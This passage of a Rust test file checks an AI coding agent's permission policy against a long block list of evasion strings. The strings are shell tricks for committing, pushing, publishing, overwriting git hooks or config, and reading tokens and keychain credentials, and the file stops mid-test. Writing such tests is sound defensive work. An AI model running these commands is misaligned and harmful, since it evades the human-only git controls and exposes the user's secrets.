//! The bypass-string suite (S0 of providers-plan 3.1): strings an agent could use to commit, push, stage
//! everything or touch protected paths. Ideas copied from `spikes/sdk/git-shim/shim.test.mjs`, extended for
//! the argv-level analysis. Every BLOCK string must be a hard stop, every PASS string must not be, and the
//! UNKNOWN ones must be unparseable (ask, never saved) rather than silently allowed.

mod common;

use common::*;
use intely_agent_core::events::types::DecidedBy;
use intely_agent_core::policy::decide::{Decision, PolicyContext, SavedAllow};
use intely_agent_core::providers::PermissionMode;

/// Must be denied as a hard stop.
const BLOCK: &[&str] = &[
    // env assignments that steer git, the loader or the programs git starts (Beta-H4 1)
    "GIT_DIR=.git git status",
    "GIT_WORK_TREE=/tmp git status",
    "GIT_PAGER=evil git log",
    "PAGER=evil git log",
    "EDITOR=evil git log",
    "VISUAL=evil git log",
    "LD_PRELOAD=x.so ls",
    "LD_LIBRARY_PATH=. ls",
    "DYLD_INSERT_LIBRARIES=x.dylib ls",
    "DYLD_LIBRARY_PATH=. ls",
    "BASH_ENV=x.sh ls",
    "ENV=x.sh ls",
    "FOO=bar PAGER=evil cat a.txt",
    "pager=evil git log",
    // plain verbs and global options
    "git commit -m x",
    "git commit",
    "git -C . commit -m x",
    "git --no-pager commit -m x",
    "git -c user.name=x commit -m x",
    "git -c user.email=a@b.c status",
    "git -C . -c user.name=x commit",
    "git --git-dir=.git commit -m x",
    "git --git-dir .git commit -m x",
    "git -c core.hooksPath=/dev/null status",
    "git push origin main",
    "git push --force",
    "git tag v1",
    "git tag -d v1",
    "git tag -f v1 HEAD~1",
    "git notes remove HEAD",
    "git tag -a v1 -m x",
    "git commit-tree HEAD^{tree} -m x",
    "git send-pack origin",
    "git update-ref refs/heads/main HEAD~1",
    "git cherry-pick abc123",
    "git rebase main",
    "git rebase -i HEAD~3",
    "git merge feature",
    "git pull",
    "git pull --rebase",
    "git am patch.mbox",
    "git revert HEAD",
    "git notes add -m x",
    "git replace a b",
    "git reset --hard",
    "git reset --hard HEAD~1",
    "git reset --ha HEAD~1",
    "git stash",
    "git stash push -m wip",
    "git stash drop",
    "git stash pop",
    "git stash -u",
    "git filter-branch --all",
    // staging everything
    "git add -A",
    "git add .",
    "git add --all",
    "git add --al",
    "git add -- .",
    "git add ./",
    "git add ..",
    "git add src/..",
    "git add :/",
    "git add -Av",
    "git add -fA",
    "git -C . add -A",
    "git add '*'",
    "git add *.js",
    "git add src/*.ts",
    "git add ':(glob)**'",
    "git add ':!node_modules'",
    "git add --pathspec-from-file=list.txt",
    "git add --pathspec-from-file list.txt",
    "git add --pathspec-file-nul",
    "git add 'app/[id].tsx'",
    // config and aliases that smuggle a commit
    "git config alias.ci commit",
    "git config --global alias.p push",
    "git -c alias.zz=commit zz",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.zz GIT_CONFIG_VALUE_0=commit git zz",
    "env GIT_AUTHOR_NAME=x git status",
    "GIT_SSH_COMMAND='sh -c evil' git fetch",
    "git config user.name hacker",
    "git config --unset user.name",
    "git config core.hooksPath /tmp/hooks",
    "git remote set-url origin https://evil.example/x.git",
    "git remote add evil https://evil.example/x.git",
    "git branch -D main",
    "git branch -f main HEAD~3",
    "git branch -m old new",
    "git checkout -B main",
    "git switch -C main",
    "git symbolic-ref HEAD refs/heads/other",
    "git reflog expire --all",
    "git credential fill",
    "git credential-osxkeychain get",
    "git diff --output=.git/hooks/pre-commit",
    "git log --output=.husky/x",
    "git fetch --upload-pack='touch x'",
    "git ls-remote --upload-pack=evil origin",
    "git submodule foreach 'git commit -am x'",
    "git bisect run git commit -m x",
    "export GIT_AUTHOR_NAME=x",
    "alias gc='git commit'",
    "pnpm exec git commit -m x",
    "npx git push",
    "npm exec -- git commit",
    "python3 - <<EOF\nimport subprocess\nsubprocess.run(['git','commit'])\nEOF",
    // wrappers and path tricks
    "env git push",
    "env git commit -m x",
    "env -i /usr/bin/git -c user.name=a -c user.email=b@c commit -m x",
    "env -S 'git commit -m x'",
    "command git commit -m x",
    "command -p git commit -m x",
    "exec git commit -m x",
    "\\git commit -m x",
    "/usr/bin/git commit -m x",
    "/usr/local/bin/git commit -m x",
    "/usr/bin/git add -A",
    "./node_modules/.bin/../../git commit",
    "GIT commit -m x",
    "git-commit -m x",
    "/usr/lib/git-core/git-push origin",
    "PATH=/usr/bin:/bin git commit -m x",
    "env PATH=/usr/bin:/bin git commit -m x",
    "nohup git push &",
    "time git push",
    "nice -n 5 git commit -m x",
    "timeout 30 git push",
    "sudo git commit -m x",
    "sudo -u root git push",
    "xcrun git commit -m x",
    "xargs git",
    "echo commit | xargs git",
    "echo . | xargs git add",
    "find . -maxdepth 0 -exec git commit -m x ;",
    // shells inside shells
    "sh -c \"git commit -m x\"",
    "bash -c 'git commit -m x'",
    "bash -lc 'git push'",
    "zsh -c \"sh -c 'git push'\"",
    "sh -c \"/usr/bin/git commit -m x\"",
    "bash -c \"git -C sub commit -m x\"",
    "bash <<EOF\ngit commit -m x\nEOF",
    "sh <<< 'git commit -m x'",
    "(git commit -m x)",
    "{ git commit -m x; }",
    "if true; then git push; fi",
    "for i in 1 2; do git commit -m x; done",
    "true && git push || true",
    "echo hi; git push",
    "git status; git push",
    "git status\ngit push",
    "cd sub && git commit -m x",
    "g() { git commit -m x; }; g",
    // quoting and encoding tricks
    "git \"commit\" -m x",
    "git 'com'mit -m x",
    "git c\"\"ommit -m x",
    "git comm\\it -m x",
    "git $'\\x63ommit' -m x",
    "git $'\\143ommit' -m x",
    // hard stops hidden in substitutions or arguments of a plain command
    "echo $(git commit -m x)",
    "echo `git push`",
    "cat <(git push)",
    "git commit -m \"$(date)\"",
    // interpreters that spawn git
    "node -e \"require('child_process').execSync('git commit -m x')\"",
    "node -e \"require('child_process').execFileSync('/usr/bin/git',['commit','-m','x'])\"",
    "python3 -c \"import subprocess;subprocess.run(['git','commit','-m','x'])\"",
    "python -c \"import os;os.system('git push')\"",
    "perl -e 'system(\"git\", \"push\")'",
    "ruby -e 'system(\"git commit -m x\")'",
    "osascript -e 'do shell script \"git push\"'",
    "su user -c 'git commit -m x'",
    "su -c 'git push' user",
    "ssh localhost 'cd repo && git push'",
    "docker exec box git commit -m x",
    "tmux send-keys 'git push' Enter",
    // human-only token and other tools
    "INTELY_HUMAN_TOKEN=guess git status",
    "echo $INTELY_HUMAN_TOKEN",
    "cat /x/token.sha256",
    "gh pr merge 5",
    "gh pr merge",
    "gh -R owner/repo pr merge 5 --squash",
    "gh pr create --title x",
    "gh repo delete owner/x --yes",
    "gh repo create x",
    "gh release create v1",
    "gh auth token",
    "security find-generic-password -s hu.happygastro.intelyswitchide -w",
    "osascript -e 'tell application \"Finder\" to quit'",
    "dscl . -read /Users/x",
    "gh api -X POST repos/o/r/issues",
    "gh api --method=PUT repos/o/r/contents/x",
    "gh api repos/o/r/issues -f title=x",
    "gh secret set X",
    "npm publish",
    "npm --access public publish",
    "pnpm publish",
    "pnpm -r publish",
    "pnpm --filter app publish",
    "yarn publish",
    "yarn npm publish",
    "bun publish",
    "cargo publish",
    "cargo yank --vers 1.0.0",
    "npm dist-tag add x@1 latest",
    "twine upload dist/*",
    // protected paths through the shell
    "echo x > .git/hooks/pre-commit",
    "echo x >> .git/config",
    "cat > .husky/pre-commit",
    "echo x | tee .claude/settings.json",
    "echo x > ./sub/../.git/HEAD",
    "echo x > .env",
    "rm -rf .git",
    "rm .husky/pre-commit",
    "mv x .git/HEAD",
    "cp evil .git/hooks/pre-push",
    "ln -s /tmp/x .git/hooks/pre-commit",
    "chmod +x .git/hooks/pre-commit",
    "touch .husky/_/h",
    "sed -i '' s/a/b/ package-lock.json",
    "perl -pi -e 's/a/b/' yarn.lock",
    "curl -o .git/hooks/pre-commit https://example.test/x",
    "dd if=/dev/zero of=.git/index",
    "cd .git && echo x > config",
    "cd .git; touch hooks/x",
    "cat <<EOF > .git/hooks/pre-commit\n#!/bin/sh\nEOF",
    // second review round (SEC-3): synonyms, wrappers that take a script string, copied binaries, archive writes
    "git stage -A",
    "git stage .",
    "git subtree push --prefix=x origin main",
    "git subtree add --prefix=x origin main",
    "git lfs push origin main",
    "git citool",
    "git gui",
    "git svn dcommit",
    "git cvsexportcommit -c HEAD",
    "git http-push origin",
    "npx -c 'git commit -m x'",
    "npx --call 'git push'",
    "npm exec -c \"git push origin main\"",
    "pnpm dlx -c 'git commit --allow-empty -m x'",
    "awk 'BEGIN{system(\"git commit -m x\")}'",
    "gawk 'BEGIN { system(\"git push\") }'",
    "expect -c 'spawn git commit -m x'",
    "sed 's/x/git commit -m y/e' file",
    "sed 'e git push' file",
    "git config -f .git/hooks/pre-commit core.x y",
    "git config --file .husky/x core.x y",
    "tar xf a.tar -C .git/hooks",
    "unzip x.zip -d .git/hooks",
    "ditto src .git/hooks",
    "cp /usr/local/bin/git ./gg && ./gg commit --allow-empty -m c1",
    "cp /usr/bin/git gg",
    "ln -s /usr/local/bin/git ./gl",
    "ln -sf /opt/homebrew/bin/git gl",
    "install -m 755 /usr/bin/git ./gg",
    "mv /usr/local/bin/git /tmp/gg",
    "rsync -a /usr/bin/git ./gg",
    "cp $(which git) gg",
    "cp \"$(command -v git)\" gg",
    "cp /usr/libexec/git-core/git-push ./gp",
    // third round (2a-Fix): option parsing of `-c`, runners and launchers, in-script aliases, binary copies by redirect
    "sh -c -- \"git push\"",
    "bash -c -x \"git commit -m x\"",
    "bash -c -e -- 'git push'",
    "bash -ec -- 'git push'",
    "chroot / git commit",
    "parallel git commit ::: x",
    "parallel git {} ::: commit",
    "entr git commit",
    "dtruss git commit",
    "lldb -o run git commit",
    "open -a Terminal.app --args git commit",
    "launchctl submit -l x -- git commit",
    "at now <<< 'git commit'",
    "crontab - <<< '* * * * * git commit'",
    "tar --to-command='git commit' -xf x.tar",
    "tar -cf x.tar --checkpoint=1 --checkpoint-action=exec='git commit' .",
    "rsync -e 'git commit' a b",
    "rsync --rsh='git push' a b",
    "trap 'git commit' EXIT",
    "alias g=git; g commit",
    "alias g='git -C sub'; g push",
    "xargs -I{} git {} <<< commit",
    "xargs -I X git X <<< push",
    "cat /usr/bin/git > gg",
    "dd if=/usr/bin/git of=gg",
    "/Library/Developer/CommandLineTools/usr/libexec/git-core/git-push",
    "sed -n '1e git commit' file",
    "mise exec -- git commit",
    "poetry run git push",
    "uv run git commit -m x",
    "bundle exec git push",
    "flock /tmp/l git commit",
    "gosu root git push",
    "direnv exec . git commit",
    "nix-shell --run 'git commit'",
    "sandbox-exec -p '(version 1)' git commit",
    // Beta-H1: a protected path as the argument of ANY tool is a hard stop (the sort -o / awk -i inplace / xxd -r /
    // checkout-index family), not only of the tools the name-based checks know
    "sort -o .git/config input.txt",
    "sort -o .git/hooks/pre-commit x",
    "sort --output=.git/config x",
    "shuf -o .husky/pre-commit x",
    "awk -i inplace '{print}' .git/config",
    "gawk -i inplace 1 .husky/pre-commit",
    "awk 'BEGIN{print \"x\" > \".git/hooks/pre-commit\"}'",
    "xxd -r hex.txt .git/hooks/pre-commit",
    "xxd -r -p hex .husky/pre-push",
    "xxd plain.bin .git/config",
    "git checkout-index -f --prefix=.git/hooks/ -a",
    "git checkout -- package-lock.json",
    "git restore .husky/pre-commit",
    "git restore --source=HEAD~1 pnpm-lock.yaml",
    "git apply --directory=.git/hooks p.patch",
    "git archive -o .claude/x.tar HEAD",
    "git mv a .husky/a",
    "git rm yarn.lock",
    "python3 tool.py .git/config",
    "python3 -m json.tool in.json yarn.lock",
    "node build.js .husky/pre-commit",
    "ruby -e 'File.write(\".git/config\", \"x\")'",
    "perl -e 'open F, \">.git/hooks/x\"'",
    "node -e \"require('fs').writeFileSync('.git/hooks/pre-commit','x')\"",
    "python3 -c \"open('.git/config','w').write('x')\"",
    "sed 'w .git/config' file",
    "sed -n 'w .husky/x' file",
    "split -l 1 x .git/hooks/p",
    "zip -r .claude/x.zip src",
    "find . -name x -fprint .git/hooks/x",
    "find .git -delete",
    "openssl enc -in a -out .git/config",
    "gzip -f .git/config",
    "less -o .git/hooks/x README.md",
    "tree -o .git/x",
    "npx prettier --write package-lock.json",
    "cp x ~/.claude/agents/developer.md",
    "mkfifo .git/hooks/pre-commit",
];

/// Script indirection: the files below are created by `script_indirection_*`; each of these must be a hard stop
/// because the script text behind the string contains a git write verb or a protected path.
const SCRIPT_BLOCK: &[&str] = &[
    "npm run ship",
    "npm run-script ship",
    "pnpm run ship",
    "yarn ship",
    "pnpm ship",
    "npm run release",
    "npm run hooks",
    "npm install",
    "npm ci",
    "pnpm install",
    "yarn install",
    "npm run build && npm run ship",
    "make deploy",
    "make hook",
    "make release",
    "bash ship.sh",
    "sh ship.sh",
    "bash -x ship.sh",
    "env bash ship.sh",
    "source ship.sh",
    ". ./ship.sh",
    "./ship.sh",
    "cd sub && bash ../ship.sh",
    "node evil.js",
    "nice node evil.js",
    "python3 evil.py",
    "python lock.py",
    "ruby evil.rb",
    "sh -c 'npm run ship'",
    "husky install",
    "npx husky init",
    "lefthook install",
    "pre-commit install",
];

/// Script indirection that ends in an Ask showing the script text (rule `exec.script`).
const SCRIPT_ASK: &[(&str, &str)] = &[
    ("npm run build", "tsc -p ."),
    ("npm test", "vitest run"),
    ("pnpm build", "tsc -p ."),
    ("yarn lint", "eslint ."),
    ("make build", "tsc"),
    ("make", "tsc"),
    ("bash ok.sh", "echo hi"),
    ("./ok.sh", "echo hi"),
    ("node ok.js", "console.log(1)"),
    ("python3 ok.py", "print(1)"),
];

/// Must NOT be a hard stop (they still ask, being commands).
const PASS: &[&str] = &[
    "git status",
    "git status --porcelain=v2 -z --branch",
    "git diff",
    "git diff --stat",
    "git diff --cached",
    "git diff HEAD~1 -- src",
    "git log --oneline -3",
    "git log --grep=commit",
    "git --no-pager log -1",
    "git add file.txt",
    "git add -u",
    "git add sub/",
    "git add sub/new.txt",
    "git add -p",
    "git add -N src/a.ts",
    "git -C . status",
    "git -c color.ui=never diff",
    "git branch",
    "git branch -a",
    "git branch -vv",
    "git branch --list 'feat*'",
    "git show HEAD --stat",
    "git rev-list --count HEAD",
    "git ls-files",
    "git blame README.md",
    "git config user.name",
    "git config --get user.email",
    "git config --list",
    "git remote -v",
    "git remote get-url origin",
    "git stash list",
    "git stash show -p",
    "git checkout -b feature/x",
    "git switch -c feature/y",
    "git restore --staged file.txt",
    "git fetch",
    "git tag",
    "git tag -l 'v*'",
    "git tag --list",
    "git tag --contains HEAD",
    "git tag -n5",
    "git notes",
    "git notes list",
    "git notes show HEAD",
    "git replace -l",
    "git merge-base main HEAD",
    "git reset --soft HEAD~1",
    "git reflog",
    "echo \"git commit\"",
    "echo git push",
    "grep -r 'git push' docs",
    "ls -la",
    "npm test",
    "npm run build",
    "pnpm install",
    "cargo test",
    "cargo build",
    "node script.js",
    "node -e \"console.log(1)\"",
    "python3 -c \"print(1)\"",
    "gh pr view 5",
    "gh pr list",
    "gh issue list",
    "gh api repos/o/r",
    "cat .env.example",
    "cp a.txt b.txt",
    "mkdir -p build/out",
    "rm -rf dist",
    "sed -i '' s/a/b/ src/a.ts",
    "echo hi > out.txt",
    "echo hi 2>&1",
    "cd sub && ls",
    "cat <<EOF > notes.txt\ngit commit\nEOF",
    "find . -name '*.ts'",
    "find . -name '*.tmp' -exec rm {} ;",
    "make test",
    "tail -n 5 .git/HEAD",
    "pnpm exec eslint .",
    "npx prettier --write src",
    "npm exec tsc",
    "export FOO=1",
    "alias ll='ls -la'",
    "git diff --output=out.patch",
    "cp -r src/git /tmp/x",
    "cp git-notes.md notes.md",
    "ln -s ../a.ts src/b.ts",
    "sed -n '/git commit/p' README.md",
    "sed -i 's/a/b/' src/a.ts",
    "awk '{print $1}' file",
    "tar tf a.tar",
    "npx -c 'ls -la'",
    "git stage-notes.txt",
    "bash -c -x 'ls'",
    "sh -c -- 'ls'",
    "trap 'rm -f tmp' EXIT",
    "trap - EXIT",
    "tar xf a.tar",
    "tar -czf git-push.tgz dir",
    "rsync -a src/ dst/",
    "rsync -e ssh a b",
    "open README.md",
    "open https://github.com/o/r/commit/abc",
    "alias g=ls; g",
    "parallel echo ::: a b",
    "xargs -I{} echo {}",
    "mise exec -- node -v",
    "uv run pytest",
    "poetry run pytest",
    "flock /tmp/l ls",
    "at now <<< 'ls'",
    "crontab -l",
    "cat README.md > copy.md",
    "cat /usr/bin/git",
    "dd if=/dev/zero of=out bs=1 count=1",
    "sed -n '1p' file",
    "sed -n '$p' file",
    "launchctl list",
    // readers may name protected paths
    "ls .git/hooks",
    "head -5 .git/config",
    "grep -r x .husky",
    "wc -l package-lock.json",
    "diff package-lock.json other.json",
    "sed -n 1p .git/config",
    "awk '{print}' .git/config",
    "xxd .git/index",
    "git log -- pnpm-lock.yaml",
    "git diff -- package-lock.json",
    "git add pnpm-lock.yaml",
    "find . -name package-lock.json",
    "echo .git/config",
    "cd .git",
    "cat yarn.lock",
];

/// The PASS strings that need no approval at all in an Edit role (low-risk reads on workspace files).
const AUTO_ALLOWED: &[&str] = &[
    "git status",
    "cd sub && ls",
    "git status --porcelain=v2 -z --branch",
    "git diff",
    "git diff --stat",
    "git diff --cached",
    "git diff HEAD~1 -- src",
    "git log --oneline -3",
    "git log --grep=commit",
    "git --no-pager log -1",
    "git -C . status",
    "git show HEAD --stat",
    "git ls-files",
    "git blame README.md",
    "grep -r 'git push' docs",
    "ls -la",
];

/// Cannot be judged statically: not a hard stop, but ask and never a saved allow.
const UNKNOWN: &[&str] = &[
    "eval \"$CMD\"",
    "eval echo hi",
    "g=git; $g status",
    "git $verb",
    "git status $(ls)",
    "echo `date`",
    "echo $((1+2))",
    "sh -c \"$CMD\"",
    "bash -c \"$(cat script.sh)\"",
    "echo \"git status\" | sh",
    "git -c \"$K\" status",
    "git add $FILES",
    "cat <(ls)",
    "echo $HOME | $SHELL",
    "git {status,log}",
    "echo 'unterminated",
    "echo 'git commit' | xargs -I{} sh -c '{}'",
    "find . -name x -exec sh -c 'ls' ;",
    "printf 'x' | python3",
    "git submodule foreach 'ls'",
    "echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo hi))))))))))",
];

fn edit(fx: &Fx) -> PolicyContext {
    ctx(fx, PermissionMode::Edit)
}

#[test]
fn block_strings_are_hard_stops() {
    let fx = fx();
    let c = edit(&fx);
    let misses: Vec<_> = BLOCK
        .iter()
        .filter_map(|cmd| {
            let d = bash(&c, cmd);
            (!(d.decision == Decision::Deny && d.by == DecidedBy::HardStop)).then(|| format!("{cmd:?} -> {:?}/{:?} ({})", d.decision, d.by, d.reason))
        })
        .collect();
    assert!(misses.is_empty(), "not blocked:\n{}", misses.join("\n"));
    assert!(BLOCK.len() >= 40 + 25, "{}", BLOCK.len());
}

#[test]
fn block_strings_stay_blocked_for_every_role_mode_and_saved_allows() {
    let fx = fx();
    for mode in PermissionMode::ALL {
        let mut c = ctx(&fx, mode);
        c.saved = vec![SavedAllow::ExecPrefix { argv: vec!["git".into()] }, SavedAllow::ExecPrefix { argv: vec!["gh".into()] }, SavedAllow::ExecPrefix { argv: vec!["echo".into()] }];
        c.role_deny = vec!["Bash".into()];
        for cmd in BLOCK {
            let d = bash(&c, cmd);
            assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{mode:?} {cmd:?}");
        }
    }
}

#[test]
fn pass_strings_are_not_hard_stops() {
    let fx = fx();
    let c = edit(&fx);
    for cmd in PASS {
        let d = bash(&c, cmd);
        assert_ne!(d.by, DecidedBy::HardStop, "{cmd:?} was wrongly hard-stopped: {}", d.reason);
        // `echo`, `tail` and the other plain readers are low-risk reads now, so Edit runs them without a card
        let want = if AUTO_ALLOWED.contains(cmd) || d.rule.as_deref() == Some("exec.low-risk-read") { Decision::Allow } else { Decision::Ask };
        assert_eq!(d.decision, want, "{cmd:?}: commands ask unless saved or a low-risk read ({})", d.reason);
    }
}

#[test]
fn pass_strings_are_not_hard_stops_in_any_mode() {
    let fx = fx();
    for mode in PermissionMode::ALL {
        let c = ctx(&fx, mode);
        for cmd in PASS {
            let d = bash(&c, cmd);
            assert_ne!(d.by, DecidedBy::HardStop, "{mode:?} {cmd:?} was wrongly hard-stopped: {}", d.reason);
            // the unattended modes never ask
            assert!(!(mode.is_unattended() && d.decision == Decision::Ask), "{mode:?} {cmd:?}: {d:?}");
        }
    }
}

#[test]
fn unknown_strings_ask_and_are_never_saved() {
    let fx = fx();
    let mut c = edit(&fx);
    c.saved = ["git", "echo", "sh", "bash", "eval", "cat"].iter().map(|a| SavedAllow::ExecPrefix { argv: vec![a.to_string()] }).collect();
    for cmd in UNKNOWN {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.by), (Decision::Ask, DecidedBy::Default), "{cmd:?}: {d:?}");
        assert_eq!(d.rule.as_deref(), Some("exec.unparseable"), "{cmd:?}");
    }
}

#[test]
fn unknown_strings_are_refused_in_automatic_and_judged_by_their_text_in_bypass() {
    let fx = fx();
    for cmd in UNKNOWN {
        let d = bash(&ctx(&fx, PermissionMode::Automatic), cmd);
        assert_eq!((d.decision, d.by, d.rule.as_deref()), (Decision::Deny, DecidedBy::RoleDeny, Some("exec.auto.unjudgeable")), "{cmd:?}: {d:?}");
        // Bypass has no static check: it allows what its raw-text scan finds nothing in, and the scan can still stop it
        let d = bash(&ctx(&fx, PermissionMode::Bypass), cmd);
        assert!(d.decision == Decision::Allow || d.by == DecidedBy::HardStop, "{cmd:?}: {d:?}");
    }
}

#[test]
fn user_level_git_and_ssh_files_outside_the_repo_are_hard_stops() {
    let fx = fx();
    let home = tempfile::tempdir().unwrap();
    let mut c = edit(&fx);
    c.home = Some(std::fs::canonicalize(home.path()).unwrap());
    for cmd in ["echo '[alias]' >> ~/.gitconfig", "echo x > ~/.ssh/config", "cp x ~/.config/git/config", "tee ~/.git-credentials <<< x", "echo x > ~/.netrc"] {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{cmd}");
    }
    for (tool, path) in [("Write", "~/.gitconfig"), ("Edit", "~/.ssh/config"), ("Write", "~/.config/gh/hosts.yml")] {
        let d = decide_tool(&c, tool, serde_json::json!({ "file_path": path, "content": "x", "old_string": "a", "new_string": "b" }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{tool} {path}");
    }
    assert_ne!(bash(&c, "echo x > ~/notes.txt").by, DecidedBy::HardStop);
}

#[test]
fn eval_of_a_visible_hard_stop_is_denied_not_asked() {
    // Stricter than "eval is unparseable -> ask": the eval argument is readable and is a hard stop.
    let fx = fx();
    let d = bash(&edit(&fx), "eval \"git commit -m x\"");
    assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop));
}

#[test]
fn relative_and_absolute_roots_are_judged_against_the_working_directory() {
    let fx = fx();
    let c = edit(&fx);
    let root = fx.cwd.display().to_string();
    for cmd in [format!("git add {root}"), format!("git add {root}/"), format!("git add {root}/sub/..")] {
        assert_eq!(bash(&c, &cmd).by, DecidedBy::HardStop, "{cmd}");
    }
    assert_ne!(bash(&c, &format!("git add {root}/src/a.ts")).by, DecidedBy::HardStop);
    // a parent of the working directory is also "everything"
    let parent = fx.cwd.parent().unwrap().display().to_string();
    assert_eq!(bash(&c, &format!("git add {parent}")).by, DecidedBy::HardStop);
}

#[test]
fn symlinked_protected_paths_are_judged_by_their_target() {
    let fx = fx();
    std::os::unix::fs::symlink(fx.cwd.join(".git"), fx.cwd.join("innocent")).unwrap();
    let c = edit(&fx);
    let d = decide_tool(&c, "Write", serde_json::json!({"file_path": "innocent/hooks/pre-commit"}));
    assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop));
    assert_eq!(bash(&c, "echo x > innocent/config").by, DecidedBy::HardStop);
}

#[test]
fn a_worktree_below_a_protected_directory_name_stays_usable() {
    let dir = tempfile::tempdir().unwrap();
    let cwd = std::fs::canonicalize(dir.path()).unwrap().join(".claude/worktrees/feature");
    std::fs::create_dir_all(cwd.join("src")).unwrap();
    let c = PolicyContext::new(PermissionMode::Edit, &cwd);
    let d = decide_tool(&c, "Edit", serde_json::json!({"file_path": "src/a.ts"}));
    assert_eq!(d.decision, Decision::Allow);
    assert_eq!(bash(&c, "echo x > src/out.txt").by, DecidedBy::Default);
    assert_eq!(bash(&c, "echo x > .husky/pre-commit").by, DecidedBy::HardStop);
}

#[test]
fn case_variants_of_protected_names_are_protected() {
    let fx = fx();
    let c = edit(&fx);
    for p in [".GIT/config", ".Husky/pre-commit", ".CLAUDE/settings.json", "Package-Lock.json", ".ENV"] {
        let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": p }));
        assert_eq!(d.by, DecidedBy::HardStop, "{p}");
    }
}


#[test]
fn monitor_and_other_command_tools_are_judged_like_bash() {
    let fx = fx();
    let c = edit(&fx);
    for cmd in ["git commit -m x", "cp /usr/local/bin/git ./gg && ./gg push", "sh -c 'git push'"] {
        let d = decide_tool(&c, "Monitor", serde_json::json!({ "command": cmd, "description": "watch" }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{cmd}");
    }
    let d = decide_tool(&c, "Monitor", serde_json::json!({ "command": "tail -f app.log" }));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("exec.ask")));
    let d = decide_tool(&ctx(&fx, PermissionMode::ReadOnly), "Monitor", serde_json::json!({ "command": "tail -f app.log" }));
    assert_eq!(d.by, DecidedBy::RoleDeny);
    // a tool with no command stays unknown -> ask
    let d = decide_tool(&c, "RemoteTrigger", serde_json::json!({ "action": "run" }));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("other.unknown")));
    // and the role deny list refuses it outright
    let mut c2 = edit(&fx);
    c2.role_deny = vec!["RemoteTrigger".into(), "Monitor".into()];
    assert_eq!(decide_tool(&c2, "RemoteTrigger", serde_json::json!({})).by, DecidedBy::RoleDeny);
}

#[test]
fn files_that_run_at_commit_time_are_never_written_without_asking() {
    let fx = fx();
    let c = edit(&fx);
    for p in [
        "package.json", "apps/web/package.json", ".lintstagedrc.js", "lint-staged.config.mjs", "lefthook.yml", ".pre-commit-config.yaml", ".simple-git-hooks.json",
        ".githooks/pre-commit", ".npmrc", ".yarnrc.yml", ".pnpmfile.cjs", "Makefile", ".vscode/tasks.json", ".github/workflows/ci.yml", ".GitHub/Workflows/ci.yml",
        // config files that the linter, the test runner, the bundler or cargo load as code (Beta-H4 2)
        ".eslintrc.js", ".eslintrc.cjs", "apps/web/.eslintrc.js", "eslint.config.js", "eslint.config.mjs", "eslint.config.ts", "jest.config.js", "jest.config.ts", "jest.config.cjs", "vitest.config.ts",
        "vitest.config.mts", "vitest.workspace.ts", "vite.config.ts", "ui/vite.config.js", "webpack.config.js", "webpack.config.prod.js", "webpack.config.ts", "babel.config.js", "babel.config.cjs",
        ".babelrc.js", ".babelrc", "prettier.config.js", ".prettierrc.js", ".prettierrc.cjs", "rollup.config.mjs", "playwright.config.ts", ".cargo/config.toml", "crates/x/.cargo/config",
        "build.rs", "crates/x/build.rs", ".vscode/settings.json", ".VSCode/Tasks.json", ".mocharc.js", "gulpfile.js", "conftest.py", "setup.py", ".lintstagedrc.mjs", "Jest.Config.JS",
    ] {
        let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": p }));
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("write.exec-surface")), "{p}");
        assert!(d.reason.contains("executes code"), "{p}: the banner says it executes code: {}", d.reason);
        let d = decide_tool(&c, "Edit", serde_json::json!({ "file_path": p }));
        assert_eq!((d.decision, d.by), (Decision::Ask, DecidedBy::Default), "Edit {p}");
    }
    for p in ["src/a.ts", ".vscode/extensions.json", "src/build.rs.md", "docs/jest.config.md", "src/vite-config.ts", "src/eslintrc.ts", ".cargo/notes.md", "src/config.toml", "src/setup.pyi", ".github/CODEOWNERS", "docs/package.json.md", "src/makefile.rs"] {
        let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": p }));
        assert_eq!(d.decision, Decision::Allow, "{p}");
    }
}

#[test]
fn the_state_directory_and_credential_stores_are_off_limits() {
    let fx = fx();
    let state = fx.cwd.join("home/Library/Application Support/IntelySwitchIDE");
    let mut c = edit(&fx);
    c.state_dir = Some(state.clone());
    let s = state.display().to_string();
    for p in [format!("{s}/enforcement.json"), format!("{s}/runs/a1.meta.json"), format!("{s}/gate.json"), "~/Library/Application Support/IntelySwitchIDE/shims/git".to_string()] {
        let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": p }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "write {p}");
        let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": p }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "read {p}");
    }
    assert_eq!(bash(&c, &format!("echo '{{}}' > '{s}/enforcement.json'")).by, DecidedBy::HardStop);
    assert_eq!(bash(&c, &format!("tee '{s}/gate.json'")).by, DecidedBy::HardStop);
    for p in ["~/.claude/.credentials.json", "~/.config/gh/hosts.yml", "~/.git-credentials", "~/.zsh_history", "~/Library/Keychains/login.keychain-db", "~/.kube/config", "~/.docker/config.json"] {
        let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": p }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "read {p}");
    }
    // ordinary reads outside the jail still just ask
    let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": "/etc/hosts" }));
    assert_eq!(d.decision, Decision::Ask);
}

#[test]
fn the_attachment_store_is_a_read_only_context_directory() {
    let fx = fx();
    let state = fx.cwd.join("home/Library/Application Support/IntelySwitchIDE");
    let mut c = edit(&fx);
    c.state_dir = Some(state.clone());
    c.add_dirs.push(state.join("attachments")); // what agent_host::run::context_for does
    let s = state.display().to_string();
